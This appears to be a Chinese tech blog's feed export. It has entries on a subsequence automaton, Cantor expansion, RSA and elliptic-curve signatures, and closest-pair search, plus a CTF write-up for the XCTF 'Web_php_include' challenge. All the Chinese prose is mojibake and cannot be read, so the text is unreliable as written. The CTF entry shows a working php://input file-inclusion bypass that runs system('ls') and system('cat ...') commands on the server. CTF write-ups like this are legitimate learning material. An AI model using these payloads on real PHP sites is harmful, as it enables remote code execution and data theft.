<p>ç®—æ³•çš„å¤§è‡´æ€æƒ³æ˜¯ä¸ºæ¯ä¸€ä¸ªä¸»ä¸²çš„å­—ç¬¦èŠ‚ç‚¹åˆ›å»ºä¸€ä¸ªä¸‹ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•èŠ‚ç‚¹ï¼Œæ–¹ä¾¿çŠ¶æ€å¿«é€Ÿè½¬æ¢ã€‚<a id="more"></a></p>
<h2 id="ç®—æ³•æ¨¡æ¿"><a href="#ç®—æ³•æ¨¡æ¿" class="headerlink" title="ç®—æ³•æ¨¡æ¿"></a>ç®—æ³•æ¨¡æ¿</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* åˆæ€æ˜¯ 0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nxt[MAX_N + <span class="number">1</span>][<span class="number">27</span>];</span><br><span class="line">    <span class="keyword">int</span> strLen = s.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; i++) nxt[strLen][i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length(); i; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) nxt[i - <span class="number">1</span>][j] = nxt[i][j];</span><br><span class="line">        nxt[i - <span class="number">1</span>][s[i - <span class="number">1</span>] - <span class="string">'a'</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>â€œç®—æ³•â€</tag>
        <tag>è‡ªåŠ¨æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>åº·æ‰˜å±•å¼€C++å®ç°</title>
    <url>/2020/09/13/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80C-%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>åº·æ‰˜å±•å¼€æ˜¯ä¸€ä¸ªå…¨æ’åˆ—åˆ°ä¸€ä¸ªè‡ªç„¶æ•°çš„åŒå°„ï¼Œå¸¸ç”¨äºæ„å»ºå“ˆå¸Œè¡¨æ—¶çš„ç©ºé—´å‹ç¼©ã€‚ åº·æ‰˜å±•å¼€çš„å®è´¨æ˜¯è®¡ç®—å½“å‰æ’åˆ—åœ¨æ‰€æœ‰ç”±å°åˆ°å¤§å…¨æ’åˆ—ä¸­çš„é¡ºåºï¼Œå› æ­¤æ˜¯å¯é€†çš„ã€‚<a id="more"></a></p>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* åº·æ‰˜å±•å¼€</span></span><br><span class="line"><span class="comment">* num[]: å…¨æ’åˆ—åºåˆ—ï¼ˆä¸‹æ ‡ä»1å¼€å§‹ï¼‰</span></span><br><span class="line"><span class="comment">* LEN ï¼šå…¨æ’åˆ—é•¿åº¦ </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cantor</span><span class="params">(<span class="keyword">int</span> num[], LEN)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>,sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; LEN;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt;= LEN;j++)</span><br><span class="line">            <span class="keyword">if</span>(num[j] &lt; num[i])</span><br><span class="line">                sum++;</span><br><span class="line">        ans += sum * factorial[LEN - i];</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* åº·æ‰˜é€†å±•å¼€</span></span><br><span class="line"><span class="comment">* index: å…¨æ’åˆ—ç´¢å¼•</span></span><br><span class="line"><span class="comment">* LEN ï¼šå…¨æ’åˆ—é•¿åº¦ </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decantor</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> LEN)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;mySet = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> div, mod, j;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= LEN;i++)&#123;</span><br><span class="line">        div = index / factorial[LEN - i];</span><br><span class="line">        mod = index % factorial[LEN - i];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>,it = mySet.<span class="built_in">begin</span>();j &lt; div;j++)it++;</span><br><span class="line">        num[i] = *it;</span><br><span class="line">        mySet.erase(it);</span><br><span class="line">        index = mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æ˜ å°„</tag>
        <tag>åº·æ‰˜å±•å¼€</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWeb_php_includeé¢˜è§£</title>
    <url>/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" target="_blank" rel="noopener"><code>Web_php_include</code></a></p>
<p>æ‰“å¼€åœºæ™¯åï¼Œæ˜¯<code>index.php</code>çš„æºç ï¼š<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚è§£è¯»ä¸€ä¸‹ï¼Œé¦–å…ˆè·å–å‚æ•°<code>hello</code>å¹¶å°†å…¶å€¼è¾“å‡ºï¼Œç„¶åè·å–<code>page</code>å‚æ•°çš„å€¼ï¼Œæ¥ç€å¦‚æœ<code>page</code>å‚æ•°ä¸­å¦‚æœåŒ…å«<code>php://</code>å­ä¸²ï¼Œåˆ™å°†å…¶æ›¿æ¢ï¼Œç›´è‡³ä¸å†åŒ…å«è¯¥å­ä¸²ï¼›ç„¶åå°†æ›¿æ¢åçš„å‚æ•°å€¼ä½œä¸ºæ–‡ä»¶åï¼Œå°†å…¶æ–‡ä»¶å¼•å…¥åˆ°<code>index.php</code>ä¸­ã€‚</p>
<p>æ€è·¯ï¼šäºŒè¯ä¸è¯´ï¼Œå…ˆç”¨å¾¡å‰‘æ‰«æå·¥å…·æ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰å“ªäº›å¯ä»¥è®¿é—®çš„ï¼Œç„¶åå‘ç°ä¸€ä¸ªåå°ç™»å½•åœ°å€ï¼ŒåŸæœ¬æƒ³çˆ†ç ´å¯†ç çš„ï¼Œä½†æ˜¯æƒ³äº†æƒ³ï¼Œé¢˜ç›®æ˜¯è¯´<code>include</code>ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯çˆ†ç ´å¯†ç ã€‚</p>
<p>åº”è¯¥è¿˜æ˜¯ä»æºç ä¸­çš„<code>include</code>ä¸‹æ‰‹ï¼Œå½“ç„¶äº†æˆ‘ä»¬å¾—å…ˆç»•è¿‡æ›¿æ¢å­—ç¬¦ä¸²çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¤§å†™çš„<code>PHP</code>è¿›è¡Œä»£æ›¿<code>php</code>ï¼Œç„¶åæˆ‘åˆå»æœäº†ä¸€ä¸‹<code>php include</code>æ¼æ´ï¼Œå‘ç°è¿˜çœŸä¸å°‘ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒé€‚åˆï¼š</p>
<p>ä»¥<code>POST</code>æ–¹å¼æäº¤ä»£ç ç‰‡æ®µï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ä¼šåœ¨ <code>index.php</code>æ‰€åœ¨æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ <code>shell.php</code> å†…å¢åŠ  <code>&lt;?php phpinfo();?&gt;</code> ä¸€å¥è¯</p>
<p>ä¸è¿‡å¾—æœ‰ä¸¤ä¸ªæ¡ä»¶:</p>
<ul>
<li><p><code>allow_url_include = On</code></p>
</li>
<li><p>å¯¹ <code>allow_url_fopen</code>ä¸åšè¦æ±‚ã€‚</p>
</li>
</ul>
<p>ç»“åˆæœ¬é¢˜ï¼Œæˆ‘ä»¬åº”è¯¥æ„é€ ä¸‹é¢çš„è¯·æ±‚ï¼š</p>
<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/D:%5CjsProject%5Chexo-blog-files%5Csource_posts%5C%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
<p>æäº¤è¿‡åï¼Œæœç„¶åœ¨é¡µé¢ä¸­è·å–äº†å¾ˆå¤šä¿¡æ¯ã€‚</p>
<p>é‚£æˆ‘ä»¬çœ‹çœ‹å½“å‰ç›®å½•ä¸‹éƒ½æœ‰å“ªäº›æ–‡ä»¶å§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ–‡ä»¶ï¼š<code>fl4gisisish3r3.php</code></p>
<p>å¥½ï¼æˆ‘ä»¬è¾“å‡ºçœ‹ä¸€ä¸‹é‡Œè¾¹çš„å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'cat fl4gisisish3r3.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶è·å–äº†<code>flag</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>==é»‘å¸½ç™½å¸½ï¼Œå°±åœ¨ä¸€å¿µä¹‹é—´ï¼==</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>includeæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°å­—ç­¾åèƒŒååŸç†</title>
    <url>/2022/10/26/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E8%83%8C%E5%90%8E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>æœ€è¿‘åœ¨å­¦ä¹ åŒºå—é“¾çš„çŸ¥è¯†ï¼Œè§‰å¾—å…¶ä¸­çš„æ•°å­—ç­¾åæŒºæœ‰æ„æ€çš„ï¼Œæƒ³äº†è§£ä¸€ä¸‹èƒŒåçš„å¤§è‡´æ•°å­¦åŸç†ã€‚å½“ç„¶äº†ï¼Œæ•°å­—ç­¾åæœ‰å¾ˆå¤šç§ï¼Œä¸€èˆ¬é‡‡ç”¨éå¯¹ç§°å¯†é’¥å¯†ç ä½“åˆ¶æ¥å®ç°ï¼Œå¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰<code>RSA</code>å’Œæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼Œä¸‹é¢è®°å½•ä¸€ä¸‹åŸºäºè¿™ä¸¤ç§ç®—æ³•çš„æ•°å­—ç­¾åå¤§è‡´åŸç†,æ³¨æ„ï¼Œæœ¬æ–‡å¹¶ä¸æ˜¯åœ¨å¼ºè°ƒå¦‚ä½•è°ƒç”¨é«˜çº§<code>API</code>ï¼Œè€Œæ˜¯æ‰“ç®—ä»æ•°å­¦åŸç†å‡ºå‘ã€‚</p>
<a id="more"></a>

<h2 id="RSAæ•°å­—ç­¾å"><a href="#RSAæ•°å­—ç­¾å" class="headerlink" title="RSAæ•°å­—ç­¾å"></a>RSAæ•°å­—ç­¾å</h2><p>è¯¥ç®—æ³•çš„æ•°å­—ç­¾ååŸç†æ¯”è¾ƒç®€å•ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘å¸Œæœ›ä½ äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<code>RSA</code>ç®—æ³•ï¼Œå¯ä»¥åœ¨ä¹‹å‰çš„<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">ã€æ–‡ç« ã€‘</a>ä¸­æ‰¾åˆ°è¯¥ç®—æ³•çš„ä»‹ç»ã€‚</p>
<p>å‡è®¾é˜¿çå’Œé˜¿å¼ºåœ¨é€šä¿¡ï¼ŒåŒæ–¹æŒæœ‰è‡ªå·±çš„ç§é’¥å’Œå¯¹æ–¹çš„å…¬é’¥ã€‚</p>
<p>åœ¨ä¹‹å‰çš„<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">ã€æ–‡ç« ã€‘</a>ä¸­ï¼Œæˆ‘ä»¬è¯æ˜äº†<br>$$<br>m^{e*d}\equiv m\pmod{n} \tag{1}<br>$$<br>å…¶ä¸­<code>&lt;e,n&gt;</code>ä½œä¸ºå…¬é’¥ï¼Œ<code>&lt;d,n&gt;</code>ä½œä¸ºå¯¹åº”çš„ç§é’¥ã€‚</p>
<p>åŒæ—¶å‡è®¾<code>&lt;e,n&gt;</code>æ˜¯é˜¿å¼ºçš„ç§é’¥ï¼Œ<code>&lt;d,n&gt;</code>æ˜¯å…¶å…¬é’¥ï¼Œå…¬é’¥åœ¨é˜¿çæ‰‹ä¸Šæœ‰ç›¸åº”çš„ä¸€ä»½å‰¯æœ¬ã€‚</p>
<p>å…ˆæ¥æ•´ç†ä¸€ä¸‹æµç¨‹ï¼šé˜¿å¼ºå‡†å¤‡å‘é€çš„æ¶ˆæ¯æ˜¯â€æˆ‘æ˜¯é˜¿å¼ºï¼Œæˆ‘å–œæ¬¢ä½ ï¼â€ï¼Œç„¶ååœ¨åé¢é™„ä¸Šäº†ä»–çš„ç­¾åï¼Œæ¥ç€å°†æ¶ˆæ¯å’Œç­¾åè¿›è¡Œç®€å•æ•´åˆ:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨é˜¿ççš„å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œç„¶åä¼ è¾“åˆ°é˜¿çï¼Œé˜¿çæ”¶åˆ°äº†ï¼Œåˆ©ç”¨å¥¹çš„ç§é’¥è§£å¯†ï¼Œæ˜¯å¯ä»¥è¿˜åŸåˆ°åŸæ¶ˆæ¯å’Œä¸€ä¸ªç­¾åã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ è¾“è¿‡ç¨‹åŠ å¯†è§£å¯†æˆ‘ä»¬ä¸å…³å¿ƒï¼Œå› ä¸ºåœ¨ä¹‹å‰ä»‹ç»<code>RSA</code>çš„æ—¶å€™ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ç­¾åçš„åŸç†ã€‚</p>
<p>å‡è®¾<code>m</code>æ˜¯â€œæˆ‘æ˜¯é˜¿å¼ºï¼Œæˆ‘å–œæ¬¢ä½ ï¼â€çš„å“ˆå¸Œå€¼ï¼Œé˜¿å¼ºåˆ©ç”¨ç§é’¥å¯¹å…¶æ±‚ä¸‹é¢çš„å¼å­ï¼š<br>$$<br>c=m^d\pmod{n}<br>$$<br>é˜¿çè§£å¯†ä¼ è¾“ä¿¡æ¯åï¼Œä¸€å®šå¯ä»¥è§£æåˆ°<code>signature: &quot;yyy&quot;</code>çš„ï¼Œå³å¯ä»¥è·å¾—åˆ°$c$ã€‚</p>
<p>é˜¿çè¦éªŒè¯è¿™å¥è¯æ˜¯ä¸æ˜¯é˜¿å¼ºè¯´çš„ï¼Œä¸‡ä¸€æ˜¯éš”å£è€ç‹è¯´çš„å‘¢ï¼Œæ˜¯å§ï¼Ÿæ¯•ç«Ÿéš”å£è€ç‹é‚£é‡Œä¹Ÿæœ‰å¥¹çš„<strong>å…¬é’¥</strong>å‘¢ã€‚</p>
<p>éªŒè¯è¿‡ç¨‹å¾ˆç®€å•ï¼Œå¥¹æ‰‹ä¸Šæœ‰é˜¿å¼ºçš„å…¬é’¥ï¼Œå¥¹åšä¸€ä¸‹è¿ç®—ï¼š<br>$$<br>m1=c^e\pmod{n}=m^{d<em>e}\pmod{n}\tag{2}<br>$$<br>æ ¹æ®å¼å­ï¼ˆ1ï¼‰,æˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥å¾—åˆ°ï¼š<br>$$<br>m1=m\pmod{n}<br>$$<br>å› æ­¤å¥¹ç›´æ¥å°†ä¹‹å‰å¾—åˆ°çš„æ¶ˆæ¯è®¡ç®—å“ˆå¸Œå€¼ï¼Œè·Ÿæ•°å­—ç­¾åéƒ¨åˆ†è¿›è¡Œå¯¹æ¯”ï¼ŒäºŒè€…ä¸€è‡´ï¼Œ*</em>åˆ™è¯´æ˜è¯¥æ¶ˆæ¯çš„ç¡®æ˜¯ç”±é˜¿å¼ºå‘å‡ºçš„**ï¼Œå› ä¸ºè®¡ç®—ç­¾åå€¼çš„è¿‡ç¨‹éœ€è¦ç”¨åˆ°é˜¿å¼ºçš„ç§é’¥ï¼Œè€Œè¯¥ç§é’¥åªæœ‰ä»–è‡ªå·±æœ¬äººæœ‰ï¼Œ==è¿™å°±è¾¾åˆ°äº†é˜²ä¼ªé€ çš„ç›®çš„==ã€‚</p>
<p>å®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬æŠŠæµç¨‹å†æ¬¡ç®€åŒ–ï¼Œå³é˜¿å¼ºå‘å¤§å®¶ï¼ˆå…¶ä»–äººæœ‰é˜¿å¼ºçš„å…¬é’¥ï¼‰å®£å¸ƒâ€œæˆ‘æ˜¯é˜¿å¼ºï¼Œæˆ‘å–œæ¬¢é˜¿çï¼â€ï¼Œå…¶ä»–äººæ”¶åˆ°æ¶ˆæ¯åï¼Œåªè¦åˆ©ç”¨é˜¿å¼ºçš„å…¬é’¥è®¡ç®—ï¼Œå³å¯éªŒè¯é˜¿å¼ºä¸€å®šæœ‰è¯´è¿‡è¿™å¥è¯ï¼Œæ— æ³•æŠµèµ–ï¼</p>
<h2 id="æ¤­åœ†æ›²çº¿ç®—æ³•æ•°å­—ç­¾å"><a href="#æ¤­åœ†æ›²çº¿ç®—æ³•æ•°å­—ç­¾å" class="headerlink" title="æ¤­åœ†æ›²çº¿ç®—æ³•æ•°å­—ç­¾å"></a>æ¤­åœ†æ›²çº¿ç®—æ³•æ•°å­—ç­¾å</h2><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹<a href="https://zhuanlan.zhihu.com/p/143122476" target="_blank" rel="noopener">ã€æ¤­åœ†æ›²çº¿åŠ å¯†åŸç†ã€‘</a>ï¼Œå…¶ä¹Ÿæ˜¯åˆ©ç”¨äº†â€œæ ¹æ®å…¬é’¥ï¼Œéš¾ä»¥åæ¨ç§é’¥â€æ¥è¾¾åˆ°å®‰å…¨ç›®çš„ï¼Œç›¸æ¯”äº<code>RSA</code>ï¼Œå¯ä»¥ä½¿ç”¨æ›´çŸ­çš„å¯†é’¥å®ç°åŒç­‰çš„å®‰å…¨å¼ºåº¦ï¼ŒåŒºå—é“¾ä¸­ç”¨çš„æ•°å­—ç­¾åç®—æ³•å°±æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ã€‚</p>
<p> å‡è®¾è¿˜æ˜¯åˆšåˆšçš„é˜¿å¼ºå’Œé˜¿ççš„åœºæ™¯ï¼Œé˜¿å¼ºçš„ç§é’¥ä¸º$k_a$ï¼Œå…¬é’¥ä¸º$p_a=k_a\cdot G$.</p>
<h3 id="ç­¾åè¿‡ç¨‹"><a href="#ç­¾åè¿‡ç¨‹" class="headerlink" title="ç­¾åè¿‡ç¨‹"></a>ç­¾åè¿‡ç¨‹</h3><p>è¯¥è¿‡ç¨‹ç”±é˜¿å¼ºå®Œæˆï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å…ˆéšæœºäº§ç”Ÿä¸€å¯¹å…¬ç§é’¥ï¼Œå³$K$å’Œ$P=K\cdot G$</li>
<li>ç„¶åå°†éšæœºäº§ç”Ÿçš„å…¬é’¥çš„Xåæ ‡æ‹¿å‡ºæ¥ï¼Œå³$r=x_P \pmod {n}$ã€‚</li>
<li>è®¡ç®—$S=(K^{-1}(hash(m)+k_a \cdot r)) \pmod{n}$ï¼Œå…¶ä¸­$K^{-1}\cdot K=1\pmod{n}$çš„é€†å…ƒã€‚</li>
<li>$r$å’Œ$S$ä½œä¸ºç­¾åç»“æœã€‚</li>
</ol>
<h3 id="éªŒè¯è¿‡ç¨‹"><a href="#éªŒè¯è¿‡ç¨‹" class="headerlink" title="éªŒè¯è¿‡ç¨‹"></a>éªŒè¯è¿‡ç¨‹</h3><p>è¯¥è¿‡ç¨‹ç”±é˜¿çå®Œæˆï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®¡ç®—$\alpha=(S^{-1}\cdot hash(m))\pmod{n}$</li>
<li>è®¡ç®—$\beta=(S^{-1}\cdot r)\pmod{n}$</li>
<li>è®¡ç®—$Y=(\alpha \cdot G+\beta \cdot p_a)\pmod{n}$</li>
<li>å¦‚æœç‚¹$Y$çš„Xåæ ‡å’Œ$r$ç›¸åŒï¼Œåˆ™éªŒè¯é€šè¿‡</li>
</ol>
<p>ä¸‹é¢æˆ‘ä»¬æ¥è¯æ˜ç¬¬å››ç‚¹ï¼š</p>
<p>å¯¹äºç­¾åè¿‡ç¨‹çš„ç¬¬3ç‚¹çš„å¼å­ï¼Œæˆ‘ä»¬ä¸¤è¾¹åŒä¹˜$S^{-1}\cdot K$ï¼Œå¾—åˆ°<br>$$<br>K=(S^{-1}\cdot(hash(m)+k_a\cdot r))\pmod{n}\tag{3}<br>$$<br>ç»§ç»­å°†éªŒè¯è¿‡ç¨‹çš„ç¬¬ä¸€ç‚¹ç¬¬äºŒç‚¹ä»£å…¥åˆ°ç¬¬ä¸‰ç‚¹ä¸­ï¼Œæœ‰ï¼š<br>$$<br>Y=(S^{-1}(hash(m)\cdot G+r\cdot p_a))\pmod{n}<br>$$<br>åŒæ—¶æ³¨æ„åˆ°ï¼Œ$p_a=k_a\cdot G$ï¼Œä»£å…¥åˆ°ä¸Šå¸‚ï¼Œæœ‰<br>$$<br>Y=(S^{-1}(hash(m)+r\cdot k_a)\cdot G)\pmod{n} \tag{4}<br>$$<br>ç»“åˆå¼å­ï¼ˆ3ï¼‰å’Œå¼å­ï¼ˆ4ï¼‰ï¼Œæˆ‘ä»¬æœ‰<br>$$<br>Y=K\cdot G \pmod{n}=P\pmod{n}<br>$$<br>è¿›è€Œè¯æ˜äº†ç¬¬å››ç‚¹ã€‚</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>æ•°å­—ç­¾å</tag>
      </tags>
  </entry>
  <entry>
    <title>æœ€å°ç‚¹å¯¹</title>
    <url>/2020/04/02/%E6%9C%80%E5%B0%8F%E7%82%B9%E5%AF%B9/</url>
    <content><![CDATA[<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>å¯¹äºç»™å®šçš„nä¸ªç‚¹ï¼Œæ±‚å‡ºè¿™äº›ç‚¹çš„æœ€å°çš„è·ç¦»ã€‚</p>
<h2 id="è§£æ³•ä¸€ï¼šæš´åŠ›æ³•"><a href="#è§£æ³•ä¸€ï¼šæš´åŠ›æ³•" class="headerlink" title="è§£æ³•ä¸€ï¼šæš´åŠ›æ³•"></a>è§£æ³•ä¸€ï¼šæš´åŠ›æ³•</h2><p>éå†ä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œæ‰¾å‡ºæœ€å°å€¼ã€‚<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 20:37:23</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:23:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">120</span>], mid[<span class="number">120</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> <span class="built_in">min</span> = <span class="number">9999.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">            <span class="built_in">min</span> = <span class="built_in">min</span> &lt; t ? <span class="built_in">min</span> : t;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>, <span class="built_in">min</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®—æ³•å¤æ‚åº¦æ˜¯ï¼šOï¼ˆn<sup>2</sup>ï¼‰</p>
